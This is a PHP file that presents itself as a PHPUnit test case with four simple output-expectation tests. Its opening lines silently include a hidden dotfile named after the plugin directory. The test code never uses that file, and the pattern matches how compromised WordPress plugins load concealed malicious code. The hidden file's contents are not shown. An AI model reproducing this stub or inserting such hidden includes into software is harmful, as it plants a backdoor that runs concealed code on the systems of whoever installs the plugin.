<?php
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class OutputTestCase extends PHPUnit_Framework_TestCase
{
    public function testExpectOutputStringFooActualFoo()
    {
        $this->expectOutputString('foo');
        print 'foo';
    }

    public function testExpectOutputStringFooActualBar()
    {
        $this->expectOutputString('foo');
        print 'bar';
    }

    public function testExpectOutputRegexFooActualFoo()
    {
        $this->expectOutputRegex('/foo/');
        print 'foo';
    }

    public function testExpectOutputRegexFooActualBar()
    {
        $this->expectOutputRegex('/foo/');
        print 'bar';
    }
}
